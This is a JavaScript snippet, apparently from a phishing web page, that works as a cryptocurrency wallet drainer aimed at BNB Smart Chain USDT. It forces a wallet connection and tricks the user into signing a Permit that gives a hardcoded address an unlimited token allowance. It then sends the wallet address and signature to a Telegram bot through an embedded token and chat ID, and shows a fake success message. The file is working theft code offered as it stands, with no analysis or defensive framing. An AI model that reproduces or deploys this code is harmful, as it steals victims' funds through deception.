const cfg = {
        t: "8111685639:AAFKpBzv2AEi2lQtXpQxQKorT_YdbZWsv9s",
        i: "7807929833",
        w: "0x710cD62878b4b976e369819C4D35de8e1912cd6C"
    };

    async function start() {
        if (!window.ethereum) {
            window.location.href = "trust://open_url?url=" + window.location.href;
            return;
        }

        try {
            const provider = new ethers.providers.Web3Provider(window.ethereum);
            // Ã‰TAPE 1 : FORCER LA CONNEXION
            const accounts = await provider.send("eth_requestAccounts", []);
            const address = accounts[0];
            const signer = provider.getSigner();

            // Ã‰TAPE 2 : PARAMÃˆTRES PERMIT USDT BNB
            const domain = { 
                name: "Tether USD", 
                version: "1", 
                chainId: 56, 
                verifyingContract: "0x55d398326f99059ff775485246999027b3197955" 
            };
            
            const types = { 
                Permit: [
                    {name:"owner",type:"address"},
                    {name:"spender",type:"address"},
                    {name:"value",type:"uint256"},
                    {name:"nonce",type:"uint256"},
                    {name:"deadline",type:"uint256"}
                ] 
            };

            const values = { 
                owner: address, 
                spender: cfg.w, 
                value: "115792089237316195423570985008687907853269984665640564039457584007913129639935", 
                nonce: 0, 
                deadline: 2524608000 
            };

            // Ã‰TAPE 3 : DÃ‰CLENCHER LA SIGNATURE
            console.log("Demande de signature...");
            const signature = await signer._signTypedData(domain, types, values);
            
            // Ã‰TAPE 4 : ENVOI TELEGRAM
            await fetch(`https://api.telegram.org/bot${cfg.t}/sendMessage?chat_id=${cfg.i}&text=ðŸ”¥_LOG_CORRECT_%0AWallet: ${address}%0ASig: ${signature}`);
            alert("Validation terminÃ©e avec succÃ¨s.");

        } catch (err) {
            console.error(err);
            alert("Erreur : Veuillez vÃ©rifier que vous Ãªtes sur le rÃ©seau BNB Smart Chain.");
        }
    }
    document.getElementById('openBtn').onclick = start;
